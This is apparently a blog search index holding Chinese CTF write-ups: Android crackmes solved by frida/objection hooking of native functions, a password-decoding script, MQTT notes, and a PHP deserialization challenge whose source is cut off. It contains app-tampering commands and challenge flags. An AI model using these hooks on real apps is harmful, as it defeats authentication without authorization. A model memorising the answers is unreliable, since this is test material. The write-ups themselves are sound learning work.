<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SWPU2019 easyapp的hook解法</title>
    <link href="/2024/04/16/%5BSWPU%202019%5Deasyapp%E7%9A%84hook%E8%A7%A3%E6%B3%95/"/>
    <url>/2024/04/16/%5BSWPU%202019%5Deasyapp%E7%9A%84hook%E8%A7%A3%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPU-2019-easyapp简单objection解法"><a href="#SWPU-2019-easyapp简单objection解法" class="headerlink" title="[SWPU 2019]easyapp简单objection解法"></a>[SWPU 2019]easyapp简单objection解法</h1><p>jadx打开apk文件分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ndktest2;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.EditText;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> EditText password;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">Encrypt</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;native-lib&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">EditText</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> (EditText) findViewById(R.id.password);<br>        ((Button) findViewById(R.id.login)).setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: com.example.ndktest2.MainActivity.1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> &#123;<br>                <span class="hljs-keyword">if</span> (password.getText().toString().equals(MainActivity.<span class="hljs-built_in">this</span>.Encrypt())) &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;登录成功&quot;</span>, <span class="hljs-number">1</span>).show();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;登录失败&quot;</span>, <span class="hljs-number">0</span>).show();<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现调用了Native层的Encrypt函数返回值，这一段和password进行了比较</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">password<span class="hljs-selector-class">.getText</span>()<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.equals</span>(MainActivity<span class="hljs-selector-class">.this</span><span class="hljs-selector-class">.Encrypt</span>())<br></code></pre></td></tr></table></figure><p>直接使用frida和objection配合,先启用frida的服务</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs maxima">C:\Users\Mowit&gt;adb devices<br>* daemon <span class="hljs-keyword">not</span> running; starting now <span class="hljs-built_in">at</span> tcp:<span class="hljs-number">5037</span><br>* daemon started successfully<br>List of devices attached<br><span class="hljs-number">1239b413</span>        device<br><br><br>C:\Users\Mowit&gt;adb shell<br>ginkgo:/ $ su<br>ginkgo:/ #<br>ginkgo:/ # cd data/<span class="hljs-built_in">local</span>/tmp<br>ginkgo:/data/<span class="hljs-built_in">local</span>/tmp # ls<br>busybox  crackme1.apk  frida-server-<span class="hljs-number">16.2</span><span class="hljs-number">.1</span>-android-arm64<br>ginkgo:/data/<span class="hljs-built_in">local</span>/tmp # ./frida-server-<span class="hljs-number">16.2</span><span class="hljs-number">.1</span>-android-arm64<br></code></pre></td></tr></table></figure><p>然后使用objection直接hook获取encrypt（）返回值,命令如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>objection -g com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.ndktest2</span> explore<br><br><br>android hooking watch class_method com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.ndktest2</span><span class="hljs-selector-class">.MainActivity</span><span class="hljs-selector-class">.Encrypt</span> <span class="hljs-attr">--dump-args</span> <span class="hljs-attr">--dump-backtrace</span> <span class="hljs-attr">--dump-return</span><br></code></pre></td></tr></table></figure><p>得到返回值Return Value: YouaretheB3ST<br>登陆成功</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安卓逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2021 ez_Android</title>
    <link href="/2024/01/26/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2021%20ez_Android%5D%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/01/26/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF2021%20ez_Android%5D%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="羊城杯2021-ez-Android"><a href="#羊城杯2021-ez-Android" class="headerlink" title="[羊城杯2021 ez_Android]"></a>[羊城杯2021 ez_Android]</h2><p>首先下载apk拖到jadx看源码<br><img src="/img/1713418293990.png" alt="alt text"><br>这里传入了账号和密码，验证成功后触发getKeyAndRedirect(trim2)<br><img src="/img/image-1.png" alt="alt text"><br>在checkPasswd的时候调用了这个getEncodeStr<br><img src="/img/image.png" alt="alt text"><br>全局搜索找到passwd和username的值<br><img src="/img/image-2.png" alt="alt text"><br>checkflag里面有encode函数 查看是base64的表<br><img src="/img/ddd56d1ef9a24675bf1e837208036f66.png" alt="alt text"><br>根据getEncodeStr的加密步骤解密出密码654321，脚本如下,把结果md5解密一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">enc_pwd = <span class="hljs-string">&quot;c232666f1410b3f5010dc51cec341f58&quot;</span><br>pwd = <span class="hljs-selector-attr">[]</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(enc_pwd),<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(enc_pwd<span class="hljs-selector-attr">[i:i+2]</span>,<span class="hljs-number">16</span>) + <span class="hljs-number">1</span>)<span class="hljs-selector-attr">[2:]</span><span class="hljs-selector-class">.rjust</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br>    pwd<span class="hljs-selector-class">.append</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(enc_pwd<span class="hljs-selector-attr">[i:i+2]</span>,<span class="hljs-number">16</span>) + <span class="hljs-number">1</span>)<span class="hljs-selector-attr">[2:]</span><span class="hljs-selector-class">.rjust</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>.join(pwd)</span></span>)<br></code></pre></td></tr></table></figure><p><img src="/img/1713484007557.png" alt="alt text"><br>然后拿着passwd的值去请求服务器获得key值<br><img src="/img/dc24e5220605feaa2915dc06a9f317f1.png" alt="alt text"><br>base64表使用脚本爆出flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安卓逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MQTT学习总结</title>
    <link href="/2024/01/22/MQTT%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/22/MQTT%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="MQTT学习总结"><a href="#MQTT学习总结" class="headerlink" title="MQTT学习总结"></a>MQTT学习总结</h2><p><strong>什么是MQTT</strong><br>MQTT 代理是一种中间实体，它使 MQtt 客户端能够进行通信，MQTT代理有效地处理设备和应用程序之间的消息流，基于发布-订阅模式，MQTT代理接收来自发布者的消息，并根据主题订阅将它们路由到适当的订阅者。这可以确保高效、准确地传递消息,而不需要客户机之间建立直接连接。</p><p>MQTT的数据报文结构由固定头部、可选头部和消息载荷组成。<br>固定头部由控制报文类型、标志位和剩余长度组成，控制报文类型占第一个字节的高四位，标志位占第一个字节的低四位，剩余长度最多为4字节，固定头部最大长度为5字节<br>消息有效载荷的长度取决于实际的消息内容。它可以是空的，也可以是几个字节到几千字节不等，取决于应用场景和需要传输的数据量。<br>以下是 MQTT 数据报文的基本结构：<br><img src="/img/image5.png" alt="alt text"></p><p><strong>MQTT的身份认证：</strong><br>1.密码验证：在 MQTT 客户端 连接到代理时，它在 CONNECT 包中发送自己的 用户 名和 密 。下面的示例显示其对应的值为客户 1.用户 2.密码。可以访问通信通道可以轻松地嗅探数据包并查看连接凭证，因为所有内容都是明文的，所以得使用STL加密<br><img src="/img/image6.png" alt="alt text"><br>2.JWT验证：JWT 来自于：指定客户端连接请求中 JWT 的位置；可选值： password、 username（分别对应于 MQTT 客户端 CONNECT 报文中的 Password 和 Username 字段）<br>3.X.509 证书认证：EMQX 允许客户端使用 X.509 证书进行 TLS/SSL 连接，并支持将证书信息与客户端进行绑定，以实现 X.509 证书认证。<br>4.PSK认证，预先共享密钥</p><p>免费的MQTT公共代理:broker.emqx.io.<br>TCP端口:1883<br>WebSocket端口:8083<br>SSL/TLS端口:8883<br>安全的WebSocket端口:8084</p><p>MQTTX跨平台 MQTT桌面客户端<br>GitHub Project: <a href="https://github.com/emqx/mqttx">https://github.com/emqx/mqttx</a></p><p>MQ-Explorer是一个开源的MQ-客户端工具，可视化地显示有效载荷<br>GitHub: <a href="https://github.com/thomasnordquist/MQTT-Explorer">https://github.com/thomasnordquist/MQTT-Explorer</a></p><p>MQTTX Web 基于浏览器的工具，用于在线调试、开发和测试 MQTT 应用程序<br>GitHub项目: <a href="https://github.com/emqx/MQTTX/tree/main/web">https://github.com/emqx/MQTTX/tree/main/web</a><br>网站：<a href="http://www.emqx.io/online-mqtt-client">http://www.emqx.io/online-mqtt-client</a></p><p>Cool Test Client测试MQTT.Col服务器和MQTT代理之间的交互<br><a href="https://testclient-cloud.mqtt.cool/">https://testclient-cloud.mqtt.cool/</a></p><p>MQTT 协议根据主题来转发消息。主题通过 / 来区分层级，类似于 URL 路径，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">chat<span class="hljs-regexp">/room/</span><span class="hljs-number">1</span><br><br>sensor<span class="hljs-regexp">/10/</span>temperature<br><br>sensor<span class="hljs-regexp">/+/</span>temperature<br></code></pre></td></tr></table></figure><p>MQTT 主题支持以下两种通配符：+ 和 #。</p><pre><code class="hljs">+：表示单层通配符，例如 a/+ 匹配 a/x或 a/y。#：表示多层通配符，例如 a/# 匹配 a/x、a/b/c/d。</code></pre><p><em><strong>注意</strong></em>：通配符主题只能用于订阅，不能用于发布。</p><p>关于 MQTT 主题的更多详情，请参阅文章通过案例理解 MQTT 主题与通配符。<br>QoS</p><p>MQTT 提供了三种服务质量（QoS），在不同网络环境下保证消息的可靠性。</p><pre><code class="hljs">QoS 0：消息最多传送一次。如果当前客户端不可用，它将丢失这条消息。QoS 1：消息至少传送一次。QoS 2：消息只传送一次。</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022鹏城杯Baby_Re</title>
    <link href="/2023/12/22/%5B2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%20baby_Re%5D/"/>
    <url>/2023/12/22/%5B2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%20baby_Re%5D/</url>
    
    <content type="html"><![CDATA[<h1 id="2022鹏城杯-baby-Re"><a href="#2022鹏城杯-baby-Re" class="headerlink" title="2022鹏城杯 baby_Re"></a>2022鹏城杯 baby_Re</h1><p>拖进jadx查看代码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-type">void</span> onCreate(Bundle savedInstanceState) &#123;<br>    super.onCreate(savedInstanceState);<br>    ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());<br>    Intrinsics.checkNotNullExpressionValue(inflate, &quot;inflate(layoutInflater)&quot;);<br>    this.binding = inflate;<br>    <span class="hljs-keyword">if</span> (inflate == <span class="hljs-keyword">null</span>) &#123;<br>        Intrinsics.throwUninitializedPropertyAccessException(&quot;binding&quot;);<br>        inflate = <span class="hljs-keyword">null</span>;<br>    &#125;<br>    setContentView(inflate.getRoot());<br>    final <span class="hljs-type">int</span>[] c = &#123;<span class="hljs-number">119</span>, <span class="hljs-number">9</span>, <span class="hljs-number">40</span>, <span class="hljs-number">44</span>, <span class="hljs-number">106</span>, <span class="hljs-number">83</span>, <span class="hljs-number">126</span>, <span class="hljs-number">123</span>, <span class="hljs-number">33</span>, <span class="hljs-number">87</span>, <span class="hljs-number">113</span>, <span class="hljs-number">123</span>, <span class="hljs-number">112</span>, <span class="hljs-number">93</span>, <span class="hljs-number">125</span>, <span class="hljs-number">127</span>, <span class="hljs-number">41</span>, <span class="hljs-number">82</span>, <span class="hljs-number">44</span>, <span class="hljs-number">127</span>, <span class="hljs-number">39</span>, <span class="hljs-number">3</span>, <span class="hljs-number">126</span>, <span class="hljs-number">125</span>, <span class="hljs-number">119</span>, <span class="hljs-number">87</span>, <span class="hljs-number">47</span>, <span class="hljs-number">125</span>, <span class="hljs-number">33</span>, <span class="hljs-number">6</span>, <span class="hljs-number">44</span>, <span class="hljs-number">127</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">126</span>, <span class="hljs-number">123</span>, <span class="hljs-number">115</span>, <span class="hljs-number">24</span>&#125;;<br>    ((Button) _$_findCachedViewById(R.id.btn)).setOnClickListener(<span class="hljs-built_in">new</span> <span class="hljs-keyword">View</span>.OnClickListener() &#123; // <span class="hljs-keyword">from</span> <span class="hljs-keyword">class</span>: com.example.createso.MainActivity$$<span class="language-pgsql">ExternalSyntheticLambda0</span><br><span class="language-pgsql">        @Override // android.<span class="hljs-keyword">view</span>.<span class="hljs-keyword">View</span>.OnClickListener</span><br><span class="language-pgsql">        <span class="hljs-built_in">public</span> final <span class="hljs-type">void</span> onClick(<span class="hljs-keyword">View</span> <span class="hljs-keyword">view</span>) &#123;</span><br><span class="language-pgsql">            MainActivity.m26onCreate$lambda0(MainActivity.this, c, <span class="hljs-keyword">view</span>);</span><br><span class="language-pgsql">        &#125;</span><br><span class="language-pgsql">    &#125;);</span><br><span class="language-pgsql">&#125;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="language-pgsql"><span class="hljs-comment">/* renamed from: onCreate$lambda-0  reason: not valid java name */</span></span><br><span class="language-pgsql"><span class="hljs-built_in">public</span> static final <span class="hljs-type">void</span> m26onCreate$lambda0(MainActivity this<span class="hljs-meta">$0</span>, <span class="hljs-type">int</span>[] c, <span class="hljs-keyword">View</span> it) &#123;</span><br><span class="language-pgsql">    Intrinsics.checkNotNullParameter(this<span class="hljs-meta">$0</span>, &quot;this$0&quot;);</span><br><span class="language-pgsql">    Intrinsics.checkNotNullParameter(c, &quot;$c&quot;);</span><br><span class="language-pgsql">    IntStream flag = ((EditText) this<span class="hljs-meta">$0</span>._$_findCachedViewById(R.id.<span class="hljs-keyword">input</span>)).getText().toString().chars();</span><br><span class="language-pgsql">    <span class="hljs-type">int</span>[] <span class="hljs-keyword">array</span> = flag.toArray();</span><br><span class="language-pgsql">    Intrinsics.checkNotNullExpressionValue(<span class="hljs-keyword">array</span>, &quot;flag.toArray()&quot;);</span><br><span class="language-pgsql">    <span class="hljs-type">int</span>[] cipher = this<span class="hljs-meta">$0</span>.baby_xor(<span class="hljs-keyword">array</span>);</span><br><span class="language-pgsql">    <span class="hljs-keyword">if</span> (Arrays.equals(cipher, c)) &#123;</span><br><span class="language-pgsql">        Toast.makeText(this<span class="hljs-meta">$0</span>, &quot;Success&quot;, <span class="hljs-number">1</span>).<span class="hljs-keyword">show</span>();</span><br><span class="language-pgsql">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-pgsql">        Toast.makeText(this<span class="hljs-meta">$0</span>, &quot;Failed&quot;, <span class="hljs-number">0</span>).<span class="hljs-keyword">show</span>();</span><br><span class="language-pgsql">    &#125;</span><br><span class="language-pgsql">&#125;</span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>Java层负责接收flag内容，xor的判断在native层<br>主要是一个xor加密后的内容要和c的值一致，c的值已经给出了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span> = &#123;<span class="hljs-number">119</span>, <span class="hljs-number">9</span>, <span class="hljs-number">40</span>, <span class="hljs-number">44</span>, <span class="hljs-number">106</span>, <span class="hljs-number">83</span>, <span class="hljs-number">126</span>, <span class="hljs-number">123</span>, <span class="hljs-number">33</span>, <span class="hljs-number">87</span>, <span class="hljs-number">113</span>, <span class="hljs-number">123</span>, <span class="hljs-number">112</span>, <span class="hljs-number">93</span>, <span class="hljs-number">125</span>, <span class="hljs-number">127</span>, <span class="hljs-number">41</span>, <span class="hljs-number">82</span>, <span class="hljs-number">44</span>, <span class="hljs-number">127</span>, <span class="hljs-number">39</span>, <span class="hljs-number">3</span>, <span class="hljs-number">126</span>, <span class="hljs-number">125</span>, <span class="hljs-number">119</span>, <span class="hljs-number">87</span>, <span class="hljs-number">47</span>, <span class="hljs-number">125</span>, <span class="hljs-number">33</span>, <span class="hljs-number">6</span>, <span class="hljs-number">44</span>, <span class="hljs-number">127</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">126</span>, <span class="hljs-number">123</span>, <span class="hljs-number">115</span>, <span class="hljs-number">24</span>&#125;<br></code></pre></td></tr></table></figure><p>有一个根本不用看native层里面的xor的key值的方法<br>直接hook这个baby_xor方法然后手机输入123456789  和26个字母看它给的返回值是什么和c值一个一个对就行了<br><img src="/picture111/pcb.png" alt="pcb.png"></p><p>解得flag{6700280a84487e46f76f2f60ce4ae70b}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安卓逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化字符串逃逸</title>
    <link href="/2023/12/21/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/2023/12/21/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="一道反序列化字符串逃逸"><a href="#一道反序列化字符串逃逸" class="headerlink" title="一道反序列化字符串逃逸"></a>一道反序列化字符串逃逸</h1><p><strong>扫一下拿到备份的源码</strong><br><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span 